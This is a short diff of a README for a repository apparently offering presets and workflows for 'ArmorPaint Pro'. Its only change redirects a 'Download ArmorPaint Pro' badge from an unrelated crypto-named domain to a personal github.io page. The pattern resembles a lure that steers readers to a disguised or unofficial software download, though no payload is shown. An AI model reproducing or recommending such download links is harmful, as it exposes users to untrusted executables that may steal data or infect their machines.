@@ -6,7 +6,7 @@ This repository curates working presets, naming rules, and end‑to‑end workfl
 
 It focuses on Windows 10/11 tuning (drivers, caches, GPU modes) and on the IO that ArmorPaint Pro users actually pass to other apps (USD, FBX, STEP, EXR, and more).
 
-[![Download ArmorPaint Pro](https://img.shields.io/badge/Download-ArmorPaint_Pro-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download ArmorPaint Pro](https://img.shields.io/badge/Download-ArmorPaint_Pro-blueviolet)](https://maciterkekli98404.github.io/.github/armorpaint-pro)
 
 ---
 
